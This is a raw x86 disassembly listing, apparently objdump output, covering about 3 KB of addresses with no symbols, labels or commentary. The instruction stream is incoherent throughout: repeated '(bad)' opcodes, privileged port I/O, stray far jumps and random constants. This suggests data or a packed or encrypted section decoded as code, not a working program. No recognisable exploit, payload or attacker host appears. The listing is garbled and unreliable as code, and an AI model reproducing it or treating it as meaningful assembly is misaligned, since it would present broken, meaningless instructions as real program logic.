  413c2a:	call   0xcc8a1ff0
  413c2f:	inc    ebp
  413c30:	(bad)  
  413c31:	stc    
  413c32:	repz inc eax
  413c34:	mov    dh,bh
  413c36:	in     eax,dx
  413c37:	pop    esi
  413c38:	xchg   DWORD PTR [ebp-0x17],ecx
  413c3b:	mov    edx,0x895e0d62
  413c40:	aaa    
  413c41:	ins    DWORD PTR es:[edi],dx
  413c42:	push   esi
  413c43:	std    
  413c44:	imul   ecx,DWORD PTR ds:0xd27187c2,0x7b
  413c4b:	xor    BYTE PTR [esi-0x1e1f1bcd],dh
  413c51:	pop    ebp
  413c52:	xchg   DWORD PTR [esi-0x1c4637cc],esi
  413c58:	ror    dl,cl
  413c5a:	sbb    DWORD PTR [eax],esp
  413c5c:	cli    
  413c5d:	cmp    eax,0xf7e27fba
  413c62:	jnp    0x413c8d
  413c64:	(bad)  
  413c65:	bound  edx,QWORD PTR [ecx+ecx*1-0x356fab08]
  413c6c:	mov    bl,dl
  413c6e:	int    0x27
  413c70:	mov    ah,0xf9
  413c72:	jbe    0x413c63
  413c74:	inc    esi
  413c75:	jb     0x413cdf
  413c77:	xor    esi,esi
  413c79:	pusha  
  413c7a:	or     esp,DWORD PTR [ebx-0x78]
  413c7d:	hlt    
  413c7e:	out    dx,al
  413c7f:	push   cs
  413c80:	cmp    eax,0x18b6d9c6
  413c85:	out    dx,al
  413c86:	cdq    
  413c87:	cmp    ebx,ebx
  413c89:	jge    0x413c9b
  413c8b:	cmp    al,0xe2
  413c8d:	fs pop ds
  413c8f:	stos   DWORD PTR es:[edi],eax
  413c90:	xchg   ecx,eax
  413c91:	xor    al,0xd2
  413c93:	int3   
  413c94:	mov    WORD PTR [ebx+0x29],es
  413c97:	xchg   DWORD PTR [edi],esp
  413c99:	nop
  413c9a:	sar    BYTE PTR [edi-0x1b1812b5],cl
  413ca0:	pop    ebx
  413ca1:	cmp    ah,ah
  413ca3:	jl     0x413c3d
  413ca5:	mov    eax,0xbc7c6a01
  413caa:	mov    edi,0x20672ba4
  413caf:	in     eax,dx
  413cb0:	outs   dx,BYTE PTR ds:[esi]
  413cb1:	sahf   
  413cb2:	or     ah,BYTE PTR [ebx]
  413cb4:	push   ebx
  413cb5:	call   0x69a08e0f
  413cba:	and    al,0xb4
  413cbc:	call   0x4d3c8550
  413cc1:	mov    BYTE PTR [edx+0x3553fdc3],dh
  413cc7:	or     al,0x98
  413cc9:	push   cs
  413cca:	fwait
  413ccb:	or     eax,0xead47e17
  413cd1:	data16 out 0xa,al
  413cd4:	cmp    bl,BYTE PTR [esi+0x3c]
  413cd7:	push   esi
  413cd8:	or     ebp,DWORD PTR [edx]
  413cda:	push   cs
  413cdb:	cld    
  413cdc:	and    edx,DWORD PTR [ecx]
  413cde:	sar    BYTE PTR [ecx-0x54],1
  413ce1:	int    0x2d
  413ce3:	imul   ebp,ecx,0x19
  413ce6:	mov    esp,0x478f77ca
  413ceb:	test   al,0x26
  413ced:	icebp  
  413cee:	scas   al,BYTE PTR es:[edi]
  413cef:	add    edi,DWORD PTR [eax+0x1d]
  413cf2:	jae    0x413cbd
  413cf4:	dec    edx
  413cf5:	and    ebp,DWORD PTR [edx-0x67ca7254]
  413cfb:	cmp    cl,BYTE PTR [ecx+0x7d]
  413cfe:	sbb    eax,0x1ec92dd9
  413d03:	pop    edx
  413d04:	daa    
  413d05:	mov    ds:0x4f53981d,eax
  413d0a:	and    bl,bh
  413d0c:	xchg   ebx,eax
  413d0d:	push   esp
  413d0e:	cs push ss
  413d10:	test   eax,0x1c872d12
  413d15:	jae    0x413d14
  413d17:	cmp    DWORD PTR [ebp-0x51f2c42f],ecx
  413d1d:	xlat   BYTE PTR es:[ebx]
  413d1f:	add    DWORD PTR [ecx-0x97ab512],ebp
  413d25:	lods   al,BYTE PTR ds:[esi]
  413d26:	jl     0x413d0b
  413d28:	adc    esi,DWORD PTR ds:0x9b784b6a
  413d2e:	fist   DWORD PTR [esi+ebp*1+0x54]
  413d32:	stos   DWORD PTR es:[edi],eax
  413d33:	scas   eax,DWORD PTR es:[edi]
  413d34:	jno    0x413cc1
  413d36:	or     eax,0xccc497a4
  413d3b:	jge    0x413d0a
  413d3d:	push   ss
  413d3e:	shl    DWORD PTR [ecx+eax*8+0x7c1aa6fd],1
  413d45:	mov    bh,0x5a
  413d47:	out    dx,al
  413d48:	ja     0x413d9b
  413d4a:	sub    BYTE PTR [edx],cl
  413d4c:	stc    
  413d4d:	mul    BYTE PTR [eax+0x6201d5a7]
  413d53:	adc    cl,0xc2
  413d56:	and    esp,ecx
  413d58:	imul   edx,DWORD PTR ds:0x1f08d214,0x48
  413d5f:	popf   
  413d60:	lahf   
  413d61:	mov    eax,0x9d62fe08
  413d66:	aaa    
  413d67:	test   BYTE PTR [esi+0x3bf9b16f],ch
  413d6d:	ins    BYTE PTR es:[edi],dx
  413d6e:	xor    eax,DWORD PTR [ebx]
  413d70:	sub    esp,DWORD PTR [edi]
  413d72:	mov    ds:0xae06735e,eax
  413d77:	ret    
  413d78:	fnstcw WORD PTR [edi+0x8]
  413d7b:	sub    al,0x37
  413d7d:	scas   eax,DWORD PTR es:[edi]
  413d7e:	jmp    0x130e:0x3ce529a
  413d85:	mov    esi,0xd8075e3b
  413d8a:	rcr    DWORD PTR [edi-0x39abc068],0xc4
  413d91:	fisub  DWORD PTR [ebx+0x115065eb]
  413d97:	jmp    0xb9d7:0x1821ad81
  413d9e:	es cld 
  413da0:	pop    edx
  413da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da2:	shl    DWORD PTR [eax],0x74
  413da5:	outs   dx,DWORD PTR ds:[esi]
  413da6:	or     dh,BYTE PTR [eax-0x6c]
  413da9:	xor    eax,0x79fde3c
  413dae:	daa    
  413daf:	pop    esp
  413db0:	lods   eax,DWORD PTR ds:[esi]
  413db1:	sbb    ch,0x7
  413db4:	sar    BYTE PTR [esi-0x6376aa02],0x1c
  413dbb:	rcr    esi,1
  413dbd:	push   0x2c467ca9
  413dc2:	cmp    BYTE PTR [ebp+ebp*4-0x78f45c4c],dl
  413dc9:	stos   BYTE PTR es:[edi],al
  413dca:	out    dx,al
  413dcb:	(bad)  
  413dcc:	push   esi
  413dcd:	mov    edx,0x128d8d1f
  413dd2:	out    dx,al
  413dd3:	test   BYTE PTR [edi+0x48],cl
  413dd6:	xchg   ecx,eax
  413dd7:	cmp    ebp,DWORD PTR [eax]
  413dd9:	in     eax,0xc6
  413ddb:	xchg   ebp,eax
  413ddc:	fsubr  DWORD PTR [ebx+0x36]
  413ddf:	pushf  
  413de0:	mov    ecx,DWORD PTR [ecx+0x5cdcdcae]
  413de6:	or     BYTE PTR [ecx+edx*1],dh
  413de9:	es jp  0x413e56
  413dec:	ficom  WORD PTR [ebx+0x76]
  413def:	lock cld 
  413df1:	fs popa 
  413df3:	mov    edi,0xa4dba9d
  413df8:	cwde   
  413df9:	mov    esp,0xe1c9eb55
  413dfe:	das    
  413dff:	adc    ecx,esp
  413e01:	mov    ds:0xacba427f,eax
  413e06:	mov    DWORD PTR [ecx],edi
  413e08:	jge    0x413e24
  413e0a:	test   al,0x47
  413e0c:	jbe    0x413dbe
  413e0e:	fdiv   QWORD PTR [ecx+ebx*1]
  413e11:	adc    DWORD PTR [ebx+0xfaab1ce],ebp
  413e17:	aam    0xb7
  413e19:	xchg   esp,eax
  413e1a:	xchg   ebx,eax
  413e1b:	setb   ch
  413e1e:	push   ebx
  413e1f:	adc    BYTE PTR [edi],bl
  413e21:	imul   edi,edi,0x7d02e5d
  413e27:	add    al,BYTE PTR [ecx+0x55]
  413e2a:	push   es
  413e2b:	imul   ebp,ebx,0xffffff94
  413e2e:	adc    edx,DWORD PTR [ecx-0x2b]
  413e31:	add    al,0x61
  413e33:	inc    ebx
  413e34:	addr16 into 
  413e36:	mov    esp,0xe5c357db
  413e3b:	out    0xb1,al
  413e3d:	les    edi,FWORD PTR [eax]
  413e3f:	cmp    edx,edx
  413e41:	ds xor eax,0x9238131a
  413e47:	push   esi
  413e48:	in     al,0x5
  413e4a:	and    bh,0xb1
  413e4d:	or     ecx,DWORD PTR [edx+0x41]
  413e50:	jae    0x413e23
  413e52:	test   DWORD PTR [edi-0x78],0x2e67f9fb
  413e59:	jns    0x413e28
  413e5b:	jmp    0x413e25
  413e5d:	and    DWORD PTR [edx+ecx*1-0x21],ecx
  413e61:	rol    BYTE PTR [ebx+0xc0522a0],0x3c
  413e68:	mov    cl,0xa9
  413e6a:	call   0x911f40b
  413e6f:	mov    bh,ch
  413e71:	mov    dh,0xff
  413e73:	cwde   
  413e74:	jae    0x413e43
  413e76:	dec    ebx
  413e77:	adc    eax,ebx
  413e79:	or     esp,DWORD PTR cs:[ecx+0x22]
  413e7d:	mov    ch,0x61
  413e7f:	xchg   ecx,eax
  413e80:	dec    esp
  413e81:	inc    esi
  413e82:	xor    esp,DWORD PTR [ecx+0x7e]
  413e85:	pop    esp
  413e86:	jo     0x413efd
  413e88:	pop    ds
  413e89:	mov    dl,0xa2
  413e8b:	loop   0x413e2e
  413e8d:	sbb    edx,ebp
  413e8f:	icebp  
  413e90:	ret    0x85d5
  413e93:	hlt    
  413e94:	jmp    0x4cbd8a46
  413e99:	mov    al,ds:0x3447ae54
  413e9e:	lahf   
  413e9f:	popa   
  413ea0:	push   0xffffffdb
  413ea2:	leave  
  413ea3:	out    0x17,al
  413ea5:	loopne 0x413ea3
  413ea7:	cmp    al,0x2f
  413ea9:	push   esp
  413eaa:	(bad)  
  413eab:	call   0x9870c223
  413eb0:	mov    bh,0x2c
  413eb2:	les    edx,FWORD PTR [ebx]
  413eb4:	sub    ebp,DWORD PTR [ebx]
  413eb6:	inc    esi
  413eb7:	cdq    
  413eb8:	in     eax,dx
  413eb9:	in     eax,0x4d
  413ebb:	and    ebp,DWORD PTR [esi+0x61]
  413ebe:	stc    
  413ebf:	sub    bl,ah
  413ec1:	or     BYTE PTR [ebx+0x37],ch
  413ec4:	pusha  
  413ec5:	jnp    0x413ea9
  413ec7:	and    BYTE PTR [edx+0x7ae421b7],cl
  413ecd:	mov    cl,BYTE PTR [eax-0x6192c1f4]
  413ed3:	add    eax,0xe4aa69e
  413ed8:	or     edi,eax
  413eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413edb:	int3   
  413edc:	lods   eax,DWORD PTR ds:[esi]
  413edd:	call   0xb368:0x4f7820f0
  413ee4:	push   edi
  413ee5:	dec    ecx
  413ee6:	stc    
  413ee7:	jo     0x413ed9
  413ee9:	mov    eax,0x967bcdef
  413eee:	sub    eax,0xdebfe9f3
  413ef3:	mov    eax,ds:0x90fc75cd
  413ef8:	dec    esp
  413ef9:	xchg   edi,eax
  413efa:	mov    dl,bl
  413efc:	in     eax,dx
  413efd:	adc    al,0x85
  413eff:	xchg   ebp,eax
  413f00:	daa    
  413f01:	pop    edi
  413f02:	out    dx,eax
  413f03:	pop    ecx
  413f04:	mov    cl,dh
  413f06:	(bad)  
  413f07:	mov    ecx,0x25a4f142
  413f0c:	and    al,BYTE PTR [ecx-0x4c]
  413f0f:	jp     0x413f7f
  413f11:	iret   
  413f12:	mov    esp,0x1a356ebe
  413f17:	dec    esp
  413f18:	jp     0x413ee5
  413f1a:	gs sbb al,0x5f
  413f1d:	sbb    al,0x5e
  413f1f:	cmp    eax,0xc70fa887
  413f24:	(bad)  
  413f25:	xor    ebx,ebp
  413f27:	xchg   esi,eax
  413f28:	mov    ch,0xc3
  413f2a:	mov    ds,WORD PTR [edi+0x2a]
  413f2d:	adc    BYTE PTR [ebx-0x5ecd3c0e],0xad
  413f34:	sbb    al,0x17
  413f36:	aam    0xdf
  413f38:	in     eax,0x9a
  413f3a:	test   al,0xb
  413f3c:	push   edi
  413f3d:	sti    
  413f3e:	fyl2x  
  413f40:	std    
  413f41:	adc    eax,0x3c344787
  413f46:	push   0x740ea607
  413f4b:	(bad)  
  413f4c:	jl     0x413f03
  413f4e:	mov    bl,BYTE PTR [esi+0x5d]
  413f51:	sbb    BYTE PTR [eax+edx*2+0xbbd88a5],cl
  413f58:	adc    BYTE PTR ds:0x79ba289f,ah
  413f5e:	add    eax,0x4da830c1
  413f63:	lds    eax,FWORD PTR [ebp+edx*4+0x5d0ee82d]
  413f6a:	shl    DWORD PTR [esi+0x2eef16b6],1
  413f70:	sbb    DWORD PTR [ebp+0x26],ebx
  413f73:	push   edi
  413f74:	sbb    al,0x85
  413f76:	mov    edx,0x9de05523
  413f7b:	jne    0x413fdd
  413f7d:	arpl   WORD PTR [ecx],ax
  413f7f:	ds dec edx
  413f81:	inc    edi
  413f82:	mov    DWORD PTR [ebx+ebp*1-0x55],esp
  413f86:	or     eax,0xba73a84e
  413f8b:	shr    al,1
  413f8d:	or     bh,ah
  413f8f:	fmul   DWORD PTR [ebp-0x553c996a]
  413f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f96:	mov    ecx,0xe978e779
  413f9b:	ds call 0x3437fad
  413fa1:	ret    0x42a1
  413fa4:	adc    cl,bh
  413fa6:	mov    fs,WORD PTR [esi]
  413fa8:	ja     0x413fe2
  413faa:	mov    bl,0xdc
  413fac:	sbb    al,0x57
  413fae:	pop    edi
  413faf:	cld    
  413fb0:	cdq    
  413fb1:	inc    esi
  413fb2:	sub    BYTE PTR [esi+eax*1-0x783ad3de],ch
  413fb9:	or     BYTE PTR [esi-0x7b],bh
  413fbc:	sub    eax,0x8bd0d8f
  413fc1:	scas   al,BYTE PTR es:[edi]
  413fc2:	sbb    edi,DWORD PTR [eax-0x672cde59]
  413fc8:	adc    al,0x63
  413fca:	sub    ecx,DWORD PTR [eax*1-0x5df36051]
  413fd1:	leave  
  413fd2:	or     DWORD PTR cs:[edx],ecx
  413fd5:	into   
  413fd6:	mov    eax,ds:0x7863fa0d
  413fdb:	jbe    0x413fbd
  413fdd:	mov    esp,0xd7421dba
  413fe2:	cmp    al,0x42
  413fe4:	sahf   
  413fe5:	dec    eax
  413fe6:	or     al,ch
  413fe8:	imul   esp,DWORD PTR [esi],0xffffff8e
  413feb:	imul   DWORD PTR [ecx+eax*8+0x20bf7f05]
  413ff2:	aas    
  413ff3:	and    BYTE PTR [edi+0x9792999],0x6
  413ffa:	push   esi
  413ffb:	js     0x413fd0
  413ffd:	inc    ecx
  413ffe:	xor    eax,0x4586387e
  414003:	std    
  414004:	and    eax,0x67a98ebf
  414009:	fyl2xp1 
  41400b:	pop    ecx
  41400c:	aam    0x3
  41400e:	pop    ds
  41400f:	imul   BYTE PTR es:[esi-0x1e0ade68]
  414016:	jl     0x413fbf
  414018:	imul   edi,DWORD PTR [ecx-0x529ccd19],0xb4115b75
  414022:	pop    es
  414023:	je     0x414041
  414025:	xchg   dl,dl
  414027:	jmp    0xab45:0x9849aa0b
  41402e:	or     BYTE PTR [ebx+0x25],dl
  414031:	outs   dx,DWORD PTR ds:[esi]
  414032:	mov    edi,0x9e8a175a
  414037:	dec    esi
  414038:	cmp    DWORD PTR [ecx-0x62],ecx
  41403b:	enter  0x146f,0x6f
  41403f:	test   DWORD PTR [ebx-0x53],ecx
  414042:	push   ecx
  414043:	xor    BYTE PTR [ebp-0x15],cl
  414046:	enter  0x798e,0x50
  41404a:	pop    ss
  41404b:	mov    ebp,0x5cb319d
  414050:	pop    es
  414051:	popa   
  414052:	sahf   
  414053:	or     eax,0x56d12480
  414058:	mov    esp,0x1771fb39
  41405d:	adc    BYTE PTR [edx+ecx*2+0x2e748ba7],0x27
  414065:	int3   
  414066:	mov    cl,0x4d
  414068:	dec    ebx
  414069:	xor    eax,0x84011ead
  41406e:	call   0x6513ff48
  414073:	inc    esi
  414074:	sub    BYTE PTR [edx],ah
  414076:	xchg   ebx,eax
  414077:	and    al,0x84
  414079:	test   BYTE PTR [esi-0x1a4b81e5],al
  41407f:	mov    edi,0x14bfe12d
  414084:	jmp    0x230630f5
  414089:	mov    al,ds:0xd20da0d1
  41408e:	(bad)  
  41408f:	mov    eax,DWORD PTR [eax-0x5f5c7d3c]
  414095:	adc    BYTE PTR [edi+ebx*4],ah
  414098:	sub    edx,DWORD PTR [esi]
  41409a:	jecxz  0x41406e
  41409c:	dec    edi
  41409d:	loope  0x4140fb
  41409f:	jno    0x414029
  4140a1:	xchg   edx,eax
  4140a2:	out    dx,eax
  4140a3:	dec    esp
  4140a4:	sbb    dl,dl
  4140a6:	je     0x41410f
  4140a8:	or     ecx,DWORD PTR [edx-0xe]
  4140ab:	aaa    
  4140ac:	pop    esp
  4140ad:	in     eax,0x89
  4140af:	pop    eax
  4140b0:	dec    edi
  4140b1:	push   esp
  4140b2:	xor    BYTE PTR [edx+0x6],bh
  4140b5:	jmp    0x47ac18b2
  4140ba:	dec    eax
  4140bb:	mov    gs,WORD PTR [ecx-0x235da130]
  4140c1:	jl     0x4140e5
  4140c3:	les    ebx,FWORD PTR [ebp+0x3534770c]
  4140c9:	xchg   esp,ebx
  4140cb:	(bad)  
  4140cc:	js     0x4140b2
  4140ce:	or     DWORD PTR [ebx],eax
  4140d0:	cdq    
  4140d1:	data16 cmp dh,BYTE PTR [eax+0x5e8ec348]
  4140d8:	(bad)  
  4140d9:	fadd   st,st(2)
  4140db:	das    
  4140dc:	ror    BYTE PTR [edx+0x106564d2],0xaa
  4140e3:	pop    esi
  4140e4:	test   al,0x64
  4140e6:	out    dx,al
  4140e7:	stos   BYTE PTR es:[edi],al
  4140e8:	mov    gs,ebp
  4140ea:	mov    ecx,0x807d9a53
  4140ef:	fwait
  4140f0:	in     al,dx
  4140f1:	mov    esp,0xa8ae8ce3
  4140f6:	sub    eax,0xa619b68e
  4140fb:	mov    edi,0xf4a45e12
  414100:	mov    edx,0xbd395866
  414105:	mov    DWORD PTR [ebx+eiz*1+0x5c],eax
  414109:	sub    DWORD PTR [eax+0x320cbbe7],ebx
  41410f:	adc    al,0x48
  414111:	pop    esp
  414112:	in     eax,0xcb
  414114:	xchg   edx,eax
  414115:	rcl    DWORD PTR [ebp+0x70],0x16
  414119:	mov    eax,ds:0x7139f52d
  41411e:	xchg   BYTE PTR [edi+0x2dd8ad73],bl
  414124:	arpl   ax,si
  414126:	sbb    BYTE PTR [ecx],dl
  414128:	sysexit 
  41412a:	push   eax
  41412b:	loop   0x414152
  41412d:	gs xor eax,0xa6628fc0
  414133:	or     BYTE PTR [ebx],0x35
  414136:	mov    ah,0x7d
  414138:	mov    edx,0x38b35396
  41413d:	push   esp
  41413e:	in     al,0x4e
  414140:	add    BYTE PTR [ebx],0xcc
  414143:	das    
  414144:	dec    edi
  414145:	aam    0xe7
  414147:	and    DWORD PTR [esi+edx*2+0x4a],ebp
  41414b:	xchg   edi,eax
  41414c:	cmp    ecx,DWORD PTR [eax-0x80]
  41414f:	les    ebp,FWORD PTR [ebx]
  414151:	adc    BYTE PTR [ebx+0x69309eb9],dl
  414157:	sahf   
  414158:	pop    edx
  414159:	mov    ebp,0xc8914dc2
  41415e:	push   ds
  41415f:	outs   dx,DWORD PTR ds:[esi]
  414160:	(bad)  
  414161:	mov    esi,0x30cd2570
  414166:	xchg   edx,eax
  414167:	jns    0x4141a2
  414169:	setae  BYTE PTR ds:0xcd0b853c
  414170:	call   DWORD PTR [edi-0xd]
  414173:	jb     0x41417a
  414175:	push   cs
  414176:	inc    ebx
  414177:	cdq    
  414178:	inc    edi
  414179:	jb     0x4141a3
  41417b:	ja     0x414156
  41417d:	test   ch,ch
  41417f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  414181:	mov    dh,0x11
  414183:	leave  
  414184:	jo     0x414143
  414186:	add    DWORD PTR [eax],eax
  414188:	sub    dh,BYTE PTR [ebx+edx*2]
  41418b:	sbb    esp,esi
  41418d:	and    ch,BYTE PTR [ecx+0x3d]
  414190:	push   ebx
  414191:	aad    0xae
  414193:	fldcw  WORD PTR [ecx-0x19785180]
  414199:	(bad)  
  41419a:	fild   QWORD PTR [ebp+0x33]
  41419d:	dec    ebx
  41419e:	or     BYTE PTR [edi],cl
  4141a0:	test   BYTE PTR [ebp+0x3e],cl
  4141a3:	mov    ebp,0xae4a49f3
  4141a8:	shl    BYTE PTR [ecx],cl
  4141aa:	ficom  WORD PTR [edi+0x5692baaa]
  4141b0:	inc    edi
  4141b1:	jnp    0x4141af
  4141b3:	test   eax,0xd5372c19
  4141b8:	leave  
  4141b9:	pop    eax
  4141ba:	nop
  4141bb:	lock out dx,eax
  4141bd:	mov    edi,0xee9a03f3
  4141c2:	(bad)  [edx]
  4141c4:	addr16 inc ebp
  4141c6:	sar    DWORD PTR [ebp+0x6dd7eb4f],1
  4141cc:	and    BYTE PTR [edi],al
  4141ce:	or     eax,0x38b7d60d
  4141d3:	cmp    DWORD PTR [ebp+0x676ea828],edi
  4141d9:	push   ds
  4141da:	or     eax,0x4cae1707
  4141df:	mov    eax,ds:0x4c406667
  4141e4:	add    eax,0x71ceaf26
  4141e9:	cs mov dh,0x97
  4141ec:	jo     0x41422e
  4141ee:	and    DWORD PTR [ebx+0x519f4e9c],ebp
  4141f4:	dec    edi
  4141f5:	sub    dl,BYTE PTR [ecx-0x68]
  4141f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141f9:	push   ss
  4141fa:	(bad)  
  4141fb:	call   0xf67ccada
  414200:	arpl   WORD PTR [ebp+0x5be9601d],si
  414206:	into   
  414207:	pop    esi
  414208:	push   ecx
  414209:	out    dx,eax
  41420a:	nop
  41420b:	cmp    DWORD PTR ds:0x767f4e69,0xd01c9a18
  414215:	mov    ebx,0xad395445
  41421a:	push   esp
  41421b:	test   DWORD PTR [ebp-0x62f55046],eax
  414221:	sub    BYTE PTR [esi+0x3f],dl
  414224:	push   edx
  414225:	and    DWORD PTR [eax+0x59a34d3d],0x24
  41422c:	retf   
  41422d:	cmp    BYTE PTR [edi],dl
  41422f:	mov    edi,0xc517879c
  414234:	jbe    0x4141c8
  414236:	jo     0x4141e2
  414238:	jo     0x4141df
  41423a:	cmp    ch,al
  41423c:	or     BYTE PTR [edx],bh
  41423e:	pop    ebx
  41423f:	out    0xcc,eax
  414241:	mov    cl,0x7d
  414243:	aad    0x3f
  414245:	and    dh,BYTE PTR [ebx]
  414247:	xchg   edi,eax
  414248:	call   0x89681671
  41424d:	pop    eax
  41424e:	mov    ebp,0x6c8daaa7
  414253:	sub    ah,BYTE PTR gs:[ebp-0x7b4cca24]
  41425a:	cmp    ecx,eax
  41425c:	loope  0x4142a5
  41425e:	pushf  
  41425f:	mov    BYTE PTR [edi],0x45
  414262:	popa   
  414263:	arpl   sp,di
  414265:	pop    edi
  414266:	test   eax,0x66551cdf
  41426b:	iret   
  41426c:	loopne 0x414231
  41426e:	dec    ebp
  41426f:	adc    DWORD PTR [edx+0x61],esi
  414272:	sbb    ch,0xa7
  414275:	retf   
  414276:	test   DWORD PTR [esi+0x43],eax
  414279:	scas   al,BYTE PTR es:[edi]
  41427a:	inc    eax
  41427b:	jo     0x4141fe
  41427d:	(bad)
  414282:	jge    0x414287
  414284:	mov    edi,0x79e5cc31
  414289:	aaa    
  41428a:	dec    ecx
  41428b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41428c:	xchg   ebx,eax
  41428d:	mov    edx,0x4248a61a
  414292:	jge    0x41429d
  414294:	mov    esp,0x81d7bbc3
  414299:	inc    eax
  41429a:	pop    esp
  41429b:	mov    bl,0x31
  41429d:	inc    ecx
  41429e:	fsub   st(0),st
  4142a0:	mov    cl,BYTE PTR ds:0x899e37f1
  4142a6:	shl    BYTE PTR [eax+0x6],cl
  4142a9:	or     esp,DWORD PTR [esi+0x39]
  4142ac:	jne    0x4142cc
  4142ae:	scas   al,BYTE PTR es:[edi]
  4142af:	pop    ds
  4142b0:	(bad)  
  4142b1:	mov    BYTE PTR [ecx],dl
  4142b3:	and    ah,bh
  4142b5:	mov    edi,0x1d8e5a6a
  4142ba:	jl     0x414323
  4142bc:	test   al,0xf2
  4142be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bf:	sbb    cl,ah
  4142c1:	mov    edx,0x9ec27e32
  4142c6:	and    al,0x9d
  4142c8:	stos   DWORD PTR es:[edi],eax
  4142c9:	sahf   
  4142ca:	and    bh,BYTE PTR [eax]
  4142cc:	or     BYTE PTR [edi],bl
  4142ce:	mov    edi,0xf57dcc38
  4142d3:	adc    al,0xb1
  4142d5:	cmp    eax,0xdd262d06
  4142da:	cs ds pop ecx
  4142dd:	leave  
  4142de:	adc    eax,0x171dcd0
  4142e3:	out    0x6a,al
  4142e5:	cli    
  4142e6:	scas   eax,DWORD PTR es:[edi]
  4142e7:	test   DWORD PTR [edx+0x75ee402f],0x304556b1
  4142f1:	out    0x6c,eax
  4142f3:	jmp    0x7003:0xa42eceac
  4142fa:	lock jne 0x41431e
  4142fd:	lods   eax,DWORD PTR ds:[esi]
  4142fe:	pop    edx
  4142ff:	mov    ds:0xab72431,al
  414304:	icebp  
  414305:	mov    esp,0x90668b2c
  41430a:	sub    ebp,ecx
  41430c:	add    ch,al
  41430e:	imul   DWORD PTR [ebp-0x270bfced]
  414314:	retf   0x1fe2
  414317:	out    0x1c,eax
  414319:	idiv   BYTE PTR [ebx]
  41431b:	add    al,0x16
  41431d:	dec    edi
  41431e:	cmp    esp,ecx
  414320:	sub    esi,DWORD PTR [ebx+0x4e]
  414323:	inc    eax
  414324:	lea    eax,[ebp-0x121782f5]
  41432a:	icebp  
  41432b:	pop    esp
  41432c:	add    cl,dl
  41432e:	sar    DWORD PTR [esi+0xd011b34],0x1d
  414335:	pop    ebp
  414336:	sub    DWORD PTR [eax+0x13],ecx
  414339:	lahf   
  41433a:	cmp    eax,0xa3ee7b24
  41433f:	push   ebx
  414340:	daa    
  414341:	mov    ecx,0x73e77e0a
  414346:	aad    0x83
  414348:	repz push eax
  41434a:	in     al,0x66
  41434c:	pop    ds
  41434d:	sub    ebp,DWORD PTR [ebp+eiz*1+0x2ccb8f28]
  414354:	test   BYTE PTR ds:0x8a5fcc12,cl
  41435a:	sar    DWORD PTR [ecx*2-0x50418a4],cl
  414361:	loope  0x4143a9
  414363:	jge    0x414398
  414365:	add    al,0xa7
  414367:	retf   0x85bb
  41436a:	pop    ecx
  41436b:	outs   dx,DWORD PTR ds:[esi]
  41436c:	jmp    0x3d8b:0x7e97a0b4
  414373:	mov    al,ds:0xa0db210e
  414378:	pop    ecx
  414379:	sub    BYTE PTR [ebp+0x64],bl
  41437c:	jmp    0x3c2dddc3
  414381:	xchg   esi,eax
  414382:	push   edx
  414383:	lods   eax,DWORD PTR ds:[esi]
  414384:	fild   DWORD PTR [eax]
  414386:	inc    eax
  414387:	add    esp,edx
  414389:	dec    esp
  41438a:	cwde   
  41438b:	mov    cl,0x93
  41438d:	pop    esi
  41438e:	and    DWORD PTR [ecx-0x77],edi
  414391:	ja     0x4143e9
  414393:	push   ss
  414394:	mov    edi,0xa4730c8c
  414399:	outs   dx,BYTE PTR ds:[esi]
  41439a:	fbld   TBYTE PTR [ecx+0x553012d6]
  4143a0:	mov    esp,0x4da21173
  4143a5:	lock xchg esi,eax
  4143a7:	out    0x70,eax
  4143a9:	mov    bl,0x98
  4143ab:	stos   BYTE PTR es:[edi],al
  4143ac:	call   0xc71:0x289fd4fa
  4143b3:	dec    esi
  4143b4:	stos   BYTE PTR es:[edi],al
  4143b5:	sar    DWORD PTR [eax+0x5aed2412],0x2e
  4143bc:	repz cmp esp,DWORD PTR [esi+0x6d]
  4143c0:	push   es
  4143c1:	sbb    edx,DWORD PTR [esi+0x5116c91c]
  4143c7:	cli    
  4143c8:	add    eax,DWORD PTR [eax-0x74]
  4143cb:	xchg   DWORD PTR [ecx+0x16],esi
  4143ce:	aaa    
  4143cf:	xchg   esp,eax
  4143d0:	and    BYTE PTR [ebx-0x2bebfcd6],dl
  4143d6:	outs   dx,BYTE PTR ds:[esi]
  4143d7:	dec    eax
  4143d8:	das    
  4143d9:	pop    ebx
  4143da:	mov    ?,WORD PTR [edx-0x4d]
  4143dd:	ja     0x41441b
  4143df:	inc    eax
  4143e0:	cs sbb esi,edi
  4143e3:	mov    WORD PTR [esi-0x71a6f745],ds
  4143e9:	stc    
  4143ea:	out    dx,eax
  4143eb:	mov    bh,0x4b
  4143ed:	gs pushf 
  4143ef:	ror    bl,cl
  4143f1:	push   ebp
  4143f2:	and    bl,al
  4143f4:	out    0x99,eax
  4143f6:	push   ss
  4143f7:	add    BYTE PTR [edi],bh
  4143f9:	inc    eax
  4143fa:	xchg   ebx,eax
  4143fb:	loope  0x41437d
  4143fd:	push   ds
  4143fe:	xchg   BYTE PTR [ecx+0x12],dl
  414401:	into   
  414402:	call   0x6c99:0x25344e46
  414409:	inc    edi
  41440a:	dec    edi
  41440b:	and    al,0xd5
  41440d:	or     eax,0x83e9b189
  414412:	fimul  WORD PTR [edi]
  414414:	inc    esi
  414415:	sbb    BYTE PTR [esi],0xe6
  414418:	mov    ebx,0x562f6a4c
  41441d:	cmp    ebp,DWORD PTR [esi+eiz*4-0x52559be6]
  414424:	scas   eax,DWORD PTR es:[edi]
  414425:	inc    edi
  414426:	inc    edx
  414427:	push   cs
  414428:	clc    
  414429:	lock sbb eax,0x8a220314
  41442f:	dec    esp
  414430:	pop    esi
  414431:	sahf   
  414432:	in     eax,dx
  414433:	mov    al,0x59
  414435:	xchg   ecx,eax
  414436:	(bad)  [ebx+0x11]
  414439:	adc    bl,BYTE PTR [esi]
  41443b:	test   eax,0x7ce01921
  414440:	ins    BYTE PTR es:[edi],dx
  414441:	repz imul esp,DWORD PTR [esi+0x21],0x345d7835
  414449:	jbe    0x414493
  41444b:	and    BYTE PTR [esi],0x3
  41444e:	xor    eax,esp
  414450:	daa    
  414451:	dec    ebx
